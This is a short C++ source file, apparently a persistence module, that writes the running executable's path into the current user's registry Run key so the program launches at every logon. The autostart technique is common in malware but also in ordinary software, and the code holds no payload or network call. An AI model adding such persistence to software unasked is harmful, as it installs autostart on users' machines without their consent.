#include "Presistence.h"

#include <iostream>
#include <windows.h>

#include "Registry.h"

void getProcessExe(LPSTR path, SIZE_T size) {
    GetModuleFileNameA(NULL, path, size);
}

int RegistryLogon(LPCSTR path, SIZE_T pathLength) {
    std::cout << path << "\n";
    try {
        HKEY key;
        DWORD disposition;
        LSTATUS createStatus = createKey(HKEY_CURRENT_USER, RUN_KEY, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,
                                         NULL, &key, &disposition);

        const BYTE* pathBytes = reinterpret_cast<const BYTE*>(path);
        setKeyIfNotAllReadyExsits(key, KEY_NAME, REG_SZ, pathBytes, pathLength);
        CloseHandle(key);

    } catch (const RegistryError& error) {
        std::cerr << getRegistryError(error) << "\n";
        return 1;
    }

    return 0;
}
